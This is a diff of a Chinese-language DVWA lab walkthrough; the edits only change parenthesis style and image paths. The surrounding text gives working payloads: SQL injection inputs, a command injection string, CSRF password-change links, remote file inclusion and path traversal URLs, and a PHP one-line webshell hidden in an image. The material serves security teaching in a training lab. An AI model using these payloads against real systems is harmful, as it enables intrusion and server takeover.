@@ -6,7 +6,7 @@
 ---
 
 ## 实验环境
-- phpstudy（php5.2珍藏版）：http://phpstudy.php.cn/wenda/404.html
+- phpstudy(php5.2珍藏版)：http://phpstudy.php.cn/wenda/404.html
 (可以测试%00 截断)
 - Microsoft Windows 10 企业版 LTSC - 10.0.17763
 - dvwa Version 1.10 *Development* (Release date: 2015-10-08)
@@ -24,9 +24,9 @@
 - [新手指南：DVWA-1.9全级别教程之Insecure CAPTCHA](https://www.freebuf.com/articles/web/119692.html)
 - [新手指南：DVWA-1.9全级别教程之SQL Injection](https://www.freebuf.com/articles/web/120747.html)
 - [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](https://www.freebuf.com/articles/web/120985.html)
-- [新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS](https://www.freebuf.com/articles/web/123779.html)
-- [DVWA 黑客攻防演练（十三）JS 攻击 JavaScript Attacks](https://www.cnblogs.com/jojo-feed/p/10206443.html)
-- [DVWA 黑客攻防实战（十五） 绕过内容安全策略 Content Security Policy (CSP) Bypass](https://www.cnblogs.com/jojo-feed/p/10204588.html)
+- [新手指南：DVWA-1.9全级别教程(完结篇，附实例)之XSS](https://www.freebuf.com/articles/web/123779.html)
+- [DVWA 黑客攻防演练(十三)JS 攻击 JavaScript Attacks](https://www.cnblogs.com/jojo-feed/p/10206443.html)
+- [DVWA 黑客攻防实战(十五) 绕过内容安全策略 Content Security Policy (CSP) Bypass](https://www.cnblogs.com/jojo-feed/p/10204588.html)
 - [2019-3-16 dvwa学习(16)--JavaScript Attacks JS攻击](https://blog.csdn.net/weixin_42555985/article/details/88641118)
 - [DVWA Weak Session IDs 通关教程](http://www.storysec.com/dvwa-weak-session-ids.html)
 - [DVWA XSS (DOM) 通关教程](http://www.storysec.com/dvwa-xss-dom.html)
@@ -45,9 +45,9 @@
 
 推荐用 [phpstudy](http://phpstudy.php.cn/) 进行快速搭建
 
-![image](../../../img/渗透/实验/dvwa1.png)
-![image](../../../img/渗透/实验/dvwa2.png)
-![image](../../../img/渗透/实验/dvwa3.png)
+![image](../../../img/渗透/实验/dvwa/dvwa1.png)
+![image](../../../img/渗透/实验/dvwa/dvwa2.png)
+![image](../../../img/渗透/实验/dvwa/dvwa3.png)
 
 修改 config.inc.php,配置数据库密码 `$_DVWA[ 'db_password' ] = 'root';`
 
@@ -57,12 +57,12 @@
 
 **难度**
 
-![image](../../../img/渗透/实验/dvwa4.png)
+![image](../../../img/渗透/实验/dvwa/dvwa4.png)
 
 ---
 
 ## Brute Force
-Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令
+Brute Force，即暴力(破解)，是指黑客利用密码字典，使用穷举法猜解出用户口令
 
 ### Low
 **服务器端核心代码**
@@ -100,28 +100,28 @@ if( isset( $_GET[ 'Login' ] ) ) {
 
 ?>
 ```
-可以看到，服务器只是验证了参数 Login 是否被设置（isset 函数在 php 中用来检测变量是否设置，该函数返回的是布尔类型的值，即 true/false），没有任何的防爆破机制，且对参数 username、password 没有做任何过滤，存在明显的 sql 注入漏洞。
+可以看到，服务器只是验证了参数 Login 是否被设置(isset 函数在 php 中用来检测变量是否设置，该函数返回的是布尔类型的值，即 true/false)，没有任何的防爆破机制，且对参数 username、password 没有做任何过滤，存在明显的 sql 注入漏洞。
 
 **利用爆破burpsuite**
 
 0. burp的安装过程略
 1. 抓包
 2. ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$
-![image](../../../img/渗透/实验/dvwa5.png)
+![image](../../../img/渗透/实验/dvwa/dvwa5.png)
 
 3. 选中Payloads，载入字典，点击Start attack进行爆破
-![image](../../../img/渗透/实验/dvwa6.png)
-![image](../../../img/渗透/实验/dvwa7.png)
+![image](../../../img/渗透/实验/dvwa/dvwa6.png)
+![image](../../../img/渗透/实验/dvwa/dvwa7.png)
 
-4. 最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。
+4. 最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度(length)“与众不同”，可推测password为正确密码，手工验证登陆成功。
 
 **手工sql注入**
 
-1. Username : admin' or '1'='1 Password :（空）,此时sql语句如下图:
-![image](../../../img/渗透/实验/dvwa8.png)
+1. Username : admin' or '1'='1 Password :(空),此时sql语句如下图:
+![image](../../../img/渗透/实验/dvwa/dvwa8.png)
 
-2. Username :admin' # Password :（空）,此时sql语句如下图:
-![image](../../../img/渗透/实验/dvwa9.png)
+2. Username :admin' # Password :(空),此时sql语句如下图:
+![image](../../../img/渗透/实验/dvwa/dvwa9.png)
 
 ### Medium
 **服务器端核心代码**
@@ -162,7 +162,7 @@ if( isset( $_GET[ 'Login' ] ) ) {
 
 ?>
 ```
-相比 Low 级别的代码，Medium 级别的代码主要增加了 mysql_real_escape_string 函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御 sql 注入攻击，但 MySQL5.5.37 以下版本如果设置编码为 GBK，能够构造编码绕过 mysql_real_escape_string 对单引号的转义（因实验环境的 MySQL 版本较新，所以并未做相应验证）；同时，$pass 做了 MD5 校验，杜绝了通过参数 password 进行 sql 注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。
+相比 Low 级别的代码，Medium 级别的代码主要增加了 mysql_real_escape_string 函数，这个函数会对字符串中的特殊符号(x00，n，r，，’，”，x1a)进行转义，基本上能够抵御 sql 注入攻击，但 MySQL5.5.37 以下版本如果设置编码为 GBK，能够构造编码绕过 mysql_real_escape_string 对单引号的转义(因实验环境的 MySQL 版本较新，所以并未做相应验证)；同时，$pass 做了 MD5 校验，杜绝了通过参数 password 进行 sql 注入的可能性。但是，依然没有加入有效的防爆破机制(sleep(2)实在算不上)。
 
 具体的 mysql_real_escape_string 函数绕过问题详见
 - [PHP防SQL注入不要再用addslashes和mysql_real_escape_string了](https://web.archive.org/web/20171107192133/https://blog.csdn.net/hornedreaper1988/article/details/43520257)
@@ -221,9 +221,9 @@ generateSessionToken();
 High级别的代码加入了 Token，可以抵御 CSRF 攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login 以及 user_token。
 
 每次服务器返回的登陆页面中都会包含一个随机的 user_token 的值，用户每次登录时都要将 user_token 一起提交。服务器收到请求后，会优先做 token 的检查，再进行 sql 查询。
-![image](../../../img/渗透/实验/dvwa10.png)
+![image](../../../img/渗透/实验/dvwa/dvwa10.png)
 
-同时，High 级别的代码中，使用了 stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string 对参数 username、password 进行过滤、转义，进一步抵御 sql 注入。
+同时，High 级别的代码中，使用了 stripslashes(去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个)、 mysql_real_escape_string 对参数 username、password 进行过滤、转义，进一步抵御 sql 注入。
 
 **使用python脚本爆破**
 
@@ -315,7 +315,7 @@ for key in open("password.txt"):
     if (i == 100):
         break
 ```
-![image](../../../img/渗透/实验/dvwa11.png)
+![image](../../../img/渗透/实验/dvwa/dvwa11.png)
 
 注: 使用 urllib3 的 ProxyManager 可以让 python 产生的 http 请求流量通过 burpsutie 的 proxy
 
@@ -325,7 +325,7 @@ import urllib3.request
     proxy = urllib3.ProxyManager('http://127.0.0.1:8080', headers=header)
     req = proxy.request('POST', url=requrl)
 ```
-![image](../../../img/渗透/实验/dvwa12.png)
+![image](../../../img/渗透/实验/dvwa/dvwa12.png)
 
 ### Impossible
 **服务器端核心代码**
@@ -435,7 +435,7 @@ generateSessionToken();
 ```
 可以看到 Impossible 级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。
 
-同时采用了更为安全的 PDO（PHP Data Object）机制防御 sql 注入，这是因为不能使用 PDO 扩展本身执行任何数据库操作，而 sql 注入的关键就是通过破坏 sql 语句结构执行恶意的 sql 命令。
+同时采用了更为安全的 PDO(PHP Data Object)机制防御 sql 注入，这是因为不能使用 PDO 扩展本身执行任何数据库操作，而 sql 注入的关键就是通过破坏 sql 语句结构执行恶意的 sql 命令。
 
 关于PDO
 - [PHP学习笔记之PDO](https://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html)
@@ -474,19 +474,19 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 **相关函数介绍**
 - **stristr(string,search,before_search)**
 
-	stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。详细如下：
+	stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分(从匹配点)，如果未找到所搜索的字符串，则返回 FALSE。详细如下：
 	```
 	string	必需。规定被搜索的字符串。
 	search	必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。
 	before_search	可选。默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。
-	返回值：返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。
+	返回值：返回字符串的剩余部分(从匹配点)。如果未找到所搜索的字符串，则返回 FALSE。
 	在 PHP 5.3 中，新增了 before_search 参数。
 	在 PHP 4.3 中，该函数变成是二进制安全的。
 	```
 
 - **php_uname(mode)**
 
-	这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。
+	这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” (此为默认，包含序列”s n r v m”里的所有模式)，”s ”(返回操作系统名称)，”n”(返回主机名)，” r”(返回版本名称)，”v”(返回版本信息)， ”m”(返回机器类型)。
 
 	可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。
 
@@ -600,7 +600,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 **漏洞利用**
 
-黑名单看似过滤了所有的非法字符，但仔细观察到是把`| `（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。
+黑名单看似过滤了所有的非法字符，但仔细观察到是把`| `(注意这里|后有一个空格)替换为空字符，于是 ”|”成了“漏网之鱼”。
 
 `127.0.0.1|net user`
 Command 1 | Command 2
@@ -669,7 +669,7 @@ generateSessionToken();
 	可以看到，Impossible 级别的代码加入了 Anti-CSRF token，同时对参数 ip 进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。
 
 ## CSRF
-CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF 与 XSS 最大的区别就在于，CSRF 并没有盗取 cookie 而是直接利用。在 2013 年发布的新版 OWASP Top 10 中，CSRF 排名第 8。
+CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息(cookie、会话等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(如转账、改密等)。CSRF 与 XSS 最大的区别就在于，CSRF 并没有盗取 cookie 而是直接利用。在 2013 年发布的新版 OWASP Top 10 中，CSRF 排名第 8。
 
 ### Low
 **服务器端核心代码**
@@ -704,13 +704,13 @@ if( isset( $_GET[ 'Change' ] ) ) {
 
 ?>
 ```
-可以看到，服务器收到修改密码的请求后，会检查参数 `password_new` 与 `password_conf` 是否相同，如果相同，就会修改密码，并没有任何的防 CSRF 机制（当然服务器对请求的发送者是做了身份验证的，是检查的 cookie，只是这里的代码没有体现= =）。
+可以看到，服务器收到修改密码的请求后，会检查参数 `password_new` 与 `password_conf` 是否相同，如果相同，就会修改密码，并没有任何的防 CSRF 机制(当然服务器对请求的发送者是做了身份验证的，是检查的 cookie，只是这里的代码没有体现= =)。
 
 **漏洞利用**
 
 `http://<IP地址!!!>/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#`
 
-当受害者点击了这个链接，他的密码就会被改成 password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）
+当受害者点击了这个链接，他的密码就会被改成 password(这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了)
 
 需要注意的是，CSRF 最关键的是利用受害者的 cookie 向服务器发送伪造请求，所以如果受害者之前用 A 浏览器登录的这个系统，而用 B 浏览器点击这个链接，攻击是不会触发的，因为 B 浏览器并不能利用 Chrome 浏览器的 cookie，所以会自动跳转到登录界面。
 
@@ -718,7 +718,7 @@ if( isset( $_GET[ 'Change' ] ) ) {
 
 **漏洞利用2**
 
-我们可以使用短链接来隐藏 URL（点击短链接，会自动跳转到真实网站），自寻搜索"短网址工具 "
+我们可以使用短链接来隐藏 URL(点击短链接，会自动跳转到真实网站)，自寻搜索"短网址工具 "
 
 **漏洞利用3**
 
@@ -731,7 +731,7 @@ if( isset( $_GET[ 'Change' ] ) ) {
 
 <h2>file not found.<h2>
 ```
-![image](../../../img/渗透/实验/dvwa13.png)
+![image](../../../img/渗透/实验/dvwa/dvwa13.png)
 
 ### Medium
 **服务器端核心代码**
@@ -777,13 +777,13 @@ if( isset( $_GET[ 'Change' ] ) ) {
 **相关函数说明**
 - **int eregi(string pattern, string string)**
 
-	检查 string 中是否含有 pattern（不区分大小写），如果有返回 True，反之 False。
+	检查 string 中是否含有 pattern(不区分大小写)，如果有返回 True，反之 False。
 
 - **stripos(string,find,start)**
 
 	stripos() 函数查找字符串在另一字符串中第一次出现的位置,不区分大小写。
 
-可以看到，Medium 级别的代码检查了保留变量 HTTP_REFERER（http 包头的 Referer 参数的值，表示来源地址）中是否包含 SERVER_NAME（http 包头的 Host 参数，及要访问的主机名，这里是 dvwa靶机的IP地址），希望通过这种机制抵御 CSRF 攻击。
+可以看到，Medium 级别的代码检查了保留变量 HTTP_REFERER(http 包头的 Referer 参数的值，表示来源地址)中是否包含 SERVER_NAME(http 包头的 Host 参数，及要访问的主机名，这里是 dvwa靶机的IP地址)，希望通过这种机制抵御 CSRF 攻击。
 
 PHP 超全局变量 `$_SERVER` 中的两个值：
 
@@ -793,11 +793,11 @@ $_SERVER['SERVER_NAME']：PHP 中获取服务器主机的名称，即 HTTP 数�
 
 **漏洞利用**
 
-过滤规则是 http 包头的 Referer 参数的值中必须包含主机名（这里是 dvwa 靶机的 IP 地址）
+过滤规则是 http 包头的 Referer 参数的值中必须包含主机名(这里是 dvwa 靶机的 IP 地址)
 
 我们可以将攻击页面命名为 <dvwa靶机的IP地址>.html 就可以绕过了
 
-![image](../../../img/渗透/实验/dvwa14.png)
+![image](../../../img/渗透/实验/dvwa/dvwa14.png)
 
 ### High
 **服务器端核心代码**
@@ -874,7 +874,7 @@ generateSessionToken();
 
 然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架 iframe 访问的地址是 http://<dvwa靶机IP>/dvwa/vulnerabilities/csrf ，位于服务器 A 上，而我们的攻击页面位于黑客服务器 B 上，两者的域名不同，域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容，除非域名 A 下的页面主动发送信息给域名 B 的页面，所以我们的攻击脚本是不可能取到改密界面中的 user_token。
 
-由于跨域是不能实现的，所以我们要将攻击代码注入到 dvwa 靶机中，才有可能完成攻击。下面利用 High 级别的存储型 XSS 漏洞协助获取 Anti-CSRF token（因为这里的 XSS 注入有长度限制，不能够注入完整的攻击脚本，所以只获取 Anti-CSRF token）。
+由于跨域是不能实现的，所以我们要将攻击代码注入到 dvwa 靶机中，才有可能完成攻击。下面利用 High 级别的存储型 XSS 漏洞协助获取 Anti-CSRF token(因为这里的 XSS 注入有长度限制，不能够注入完整的攻击脚本，所以只获取 Anti-CSRF token)。
 
 注入代码如下
 `<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`
@@ -896,7 +896,7 @@ generateSessionToken();
 
 为了方便测试，在 x.js 里只写了 `alert('HelloDVWA')`
 
-![image](../../../img/渗透/实验/dvwa82.png)
+![image](../../../img/渗透/实验/dvwa/dvwa82.png)
 
 发现成功了！！！x.js 被成功加载了。但多次加载还是有问题
 
@@ -975,15 +975,15 @@ generateSessionToken();
 
 ?>
 ```
-可以看到，Impossible 级别的代码利用 PDO 技术防御 SQL 注入，至于防护 CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行 CSRF 攻击。
+可以看到，Impossible 级别的代码利用 PDO 技术防御 SQL 注入，至于防护 CSRF，则要求用户输入原始密码(简单粗暴)，攻击者在不知道原始密码的情况下，无论如何都无法进行 CSRF 攻击。
 
 ---
 
 ## File Inclusion
-File Inclusion，意思是文件包含（漏洞），是指当服务器开启 allow_url_include 选项时，就可以通过 php 的某些特性函数（include()，require() 和 include_once()，require_once()）利用 url 去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了 php 置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）。
+File Inclusion，意思是文件包含(漏洞)，是指当服务器开启 allow_url_include 选项时，就可以通过 php 的某些特性函数(include()，require() 和 include_once()，require_once())利用 url 去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了 php 置中的 allow_url_fopen 选项(选项开启之后，服务器允许包含一个远程的文件)。
 
 phpstudy开一下这2个参数
-![image](../../../img/渗透/实验/dvwa15.png)
+![image](../../../img/渗透/实验/dvwa/dvwa15.png)
 
 ### Low
 **服务器端核心代码**
@@ -1002,7 +1002,7 @@ $file = $_GET[ 'page' ];
 
 点击 file1.php 后，显示如下
 
-![image](../../../img/渗透/实验/dvwa16.png)
+![image](../../../img/渗透/实验/dvwa/dvwa16.png)
 
 而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此 page 参数是不可控的。
 
@@ -1011,25 +1011,25 @@ $file = $_GET[ 'page' ];
 构造 url`http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=/etc/shadow`
 报错，显示没有这个文件，说明不是服务器系统不是 Linux,但同时暴露了服务器文件的绝对路径
 
-![image](../../../img/渗透/实验/dvwa17.png)
+![image](../../../img/渗透/实验/dvwa/dvwa17.png)
 
-- **构造url（绝对路径）**
+- **构造url(绝对路径)**
 
     `http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
 
-    ![image](../../../img/渗透/实验/dvwa18.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa18.png)
 
     成功读取了服务器的 php.ini 文件
 
     `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file4.php`
 
-- **构造url（相对路径）**
+- **构造url(相对路径)**
 
     `http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini`
 
     加这么多 ../ 是为了保证到达服务器的C盘根目录，可以看到读取是成功的。
 
-    ![image](../../../img/渗透/实验/dvwa19.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa19.png)
 
     同时我们看到，配置文件中的 Magic_quote_gpc 选项为 off。在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，我们可以在文件名中使用 %00 进行截断，也就是说文件名中 %00 后的内容不会被识别，即下面两个 url 是完全等效的。
 
@@ -1056,7 +1056,7 @@ phpinfo();
 
 成功在服务器上执行了 phpinfo 函数
 
-![image](../../../img/渗透/实验/dvwa20.png)
+![image](../../../img/渗透/实验/dvwa/dvwa20.png)
 
 为了增加隐蔽性，可以对 http://<服务器B IP地址!!!>/phpinfo.txt 进行 URL 编码
 
@@ -1087,7 +1087,7 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 **相关函数**
 - **str_replace()**
-	str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。
+	str_replace() 函数以其他字符替换字符串中的一些字符(区分大小写)。
 
 	该函数必须遵循下列规则：
 	- 如果搜索的字符串是数组，那么它将返回数组。
@@ -1107,13 +1107,13 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/DVWA/php.ini` 读取配置文件成功
 
-![image](../../../img/渗透/实验/dvwa21.png)
+![image](../../../img/渗透/实验/dvwa/dvwa21.png)
 
 **远程文件包含**
 
 `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=hhttp://ttp://<服务器B IP地址!!!>/phpinfo.txt` 远程执行命令成功
 
-![image](../../../img/渗透/实验/dvwa22.png)
+![image](../../../img/渗透/实验/dvwa/dvwa22.png)
 
 经过编码后的 url 不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的 page 参数依然是http://<IP地址!!!>/phpinfo.txt，因此读取失败。
 
@@ -1151,9 +1151,9 @@ High 级别的代码规定只能包含 file 开头的文件，看似安全，不
 
 构造 url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file://C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
 
-![image](../../../img/渗透/实验/dvwa23.png)
+![image](../../../img/渗透/实验/dvwa/dvwa23.png)
 
-至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为 php 的文件，然后再利用 file 协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。
+至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为 php 的文件，然后再利用 file 协议去包含上传文件(需要知道上传文件的绝对路径)，从而实现任意命令执行。
 
 ### Impossible
 **服务器端核心代码**
@@ -1186,7 +1186,7 @@ File Upload，即文件上传漏洞，通常是由于对上传文件的类型、
 
 在HTML `<form>` 标签中 enctype 属性规定在发送到服务器之前应该如何对表单数据进行编码。它的值有三种：
 ```
-application/x-www-form-urlencoded: 在发送前编码所有字符（默认）
+application/x-www-form-urlencoded: 在发送前编码所有字符(默认)
 
 multipart/form-data: 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。
 
@@ -1243,7 +1243,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 	参数介绍：
 
-	$path: 必需。规定要检查的路径。在 Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。
+	$path: 必需。规定要检查的路径。在 Windows中，斜线(/)和反斜线(\)都可以用作目录分隔符。在其它环境下是斜线(/)。
 
 	$suffix: 可选。规定文件扩展名。如果文件有 suffix，则不会输出这个扩展名。
 
@@ -1253,24 +1253,24 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。
 
-上传文件 shell.php（一句话木马）
+上传文件 shell.php(一句话木马)
 ```php
 <?php @eval($_POST['ant']); ?>
 ```
 
 上传成功，并且返回了上传路径
 
-![image](../../../img/渗透/实验/dvwa24.png)
+![image](../../../img/渗透/实验/dvwa/dvwa24.png)
 
 注:这里推荐用开源的 [antSword](https://github.com/AntSwordProject/antSword) 连接webshell，安装步骤这里略
 
 `http://<IP地址!!!>/dvwa/hackable/uploads/shell.php`
 
-![image](../../../img/渗透/实验/dvwa25.png)
+![image](../../../img/渗透/实验/dvwa/dvwa25.png)
 
 然后 antSword 就会通过向服务器发送包含 ant 参数的 post 请求，在服务器上执行任意命令，获取 webshell 权限。可以下载、修改服务器的所有文件。
 
-![image](../../../img/渗透/实验/dvwa26.png)
+![image](../../../img/渗透/实验/dvwa/dvwa26.png)
 
 ### Medium
 **服务器端核心代码**
@@ -1310,13 +1310,13 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 ?>
 ```
 
-可以看到，Medium 级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是 jpeg 或者 png，大小不能超过 100000B（约为 97.6KB）。
+可以看到，Medium 级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是 jpeg 或者 png，大小不能超过 100000B(约为 97.6KB)。
 
-**组合拳（文件包含+文件上传）**
+**组合拳(文件包含+文件上传)**
 
 因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为 shell.png , 上传成功
 
-![image](../../../img/渗透/实验/dvwa27.png)
+![image](../../../img/渗透/实验/dvwa/dvwa27.png)
 
 尝试使用 antSword 连接,不幸的是，虽然成功上传了文件，但是并不能成功获取 webshell 权限，在 antSword 上会报错
 
@@ -1329,17 +1329,17 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 注: 这里的 post 需要一个带 Medium 级别的 cookie 请求，antSword 现在貌似不支持带 cookie 访问，我是自己配置 burp 代理，用 burp 抓包加上 cookie 进行访问的
 
-![image](../../../img/渗透/实验/dvwa28.png)
-![image](../../../img/渗透/实验/dvwa29.png)
+![image](../../../img/渗透/实验/dvwa/dvwa28.png)
+![image](../../../img/渗透/实验/dvwa/dvwa29.png)
 
 **抓包修改文件类型**
 上传 shell.png 文件，抓包。
 
-![image](../../../img/渗透/实验/dvwa30.png)
+![image](../../../img/渗透/实验/dvwa/dvwa30.png)
 
 可以看到文件类型为 image/png，尝试修改 filename 为 shell.php。
 
-![image](../../../img/渗透/实验/dvwa31.png)
+![image](../../../img/渗透/实验/dvwa/dvwa31.png)
 
 上传成功。上 antSword 连接
 
@@ -1347,10 +1347,10 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，可以在文件名中使用 %00 截断，所以可以把上传文件命名为 shell.php%00.png。
 
-![image](../../../img/渗透/实验/dvwa32.png)
+![image](../../../img/渗透/实验/dvwa/dvwa32.png)
 
 可以看到，包中的文件类型为 image/png，可以通过文件类型检查。上传成功。
-![image](../../../img/渗透/实验/dvwa33.png)
+![image](../../../img/渗透/实验/dvwa/dvwa33.png)
 
 而服务器会认为其文件名为 shell.php，顺势解析为 php 文件。
 
@@ -1427,11 +1427,11 @@ GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61 |GIF89(7)a
 
 `copy 1.jpg/b+php.php/a shell.jpg`
 
-![image](../../../img/渗透/实验/dvwa34.png)
+![image](../../../img/渗透/实验/dvwa/dvwa34.png)
 
 打开可以看到，一句话木马藏到了最后。顺利通过文件头检查，可以成功上传。
 
-![image](../../../img/渗透/实验/dvwa35.png)
+![image](../../../img/渗透/实验/dvwa/dvwa35.png)
 
 注：我在 win10 裸机上进行的 phpstury 环境搭建，在这一步上传过程中，一直失败，后来发现是 windows defender 把上传上来的图片马杀掉了，所以出现同类问题可以检查下杀软情况
 
@@ -1441,7 +1441,7 @@ antSword 连接：
 
 这里和上面一样，自己抓包加上 cookie
 
-![image](../../../img/渗透/实验/dvwa36.png)
+![image](../../../img/渗透/实验/dvwa/dvwa36.png)
 
 ### Impossible
 **服务器端核心代码**
@@ -1520,13 +1520,13 @@ generateSessionToken();
 
 - **imagejpeg ( image , filename , quality)**
 
-    从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。
+    从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0(最差质量，文件更小)到 100(最佳质量，文件最大)。
 
 - **imagedestroy( img )**
 
     函数销毁图像资源
 
-可以看到，Impossible 级别的代码对上传文件进行了重命名（为 md5 值，导致 %00 截断无法绕过过滤规则），加入 Anti-CSRF token 防护 CSRF 攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。
+可以看到，Impossible 级别的代码对上传文件进行了重命名(为 md5 值，导致 %00 截断无法绕过过滤规则)，加入 Anti-CSRF token 防护 CSRF 攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。
 
 ---
 
@@ -1546,7 +1546,7 @@ $_DVWA[ 'recaptcha_private_key' ] = '你的私钥';
 
 这一模块的验证码使用的是 Google 提供 reCAPTCHA 服务，下图是验证的具体流程。
 
-![image](../../../img/渗透/实验/dvwa37.png)
+![image](../../../img/渗透/实验/dvwa/dvwa37.png)
 
 服务器通过调用 recaptcha_check_answer 函数检查用户输入的正确性。
 
@@ -1643,7 +1643,7 @@ if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
 
 首先输入密码，点击 Change 按钮，抓包，更改 step 参数绕过验证码：
 
-![image](../../../img/渗透/实验/dvwa38.png)
+![image](../../../img/渗透/实验/dvwa/dvwa38.png)
 
 ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有 recaptcha_challenge_field、recaptcha_response_field 两个参数
 
@@ -1677,7 +1677,7 @@ ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包�
 ```
 
 当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。
-美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回 302，实现自动跳转），从而意识到自己遭到了攻击
+美中不足的是，受害者会看到更改密码成功的界面(这是因为修改密码成功后，服务器会返回 302，实现自动跳转)，从而意识到自己遭到了攻击
 
 ### Medium
 **服务器端核心代码**
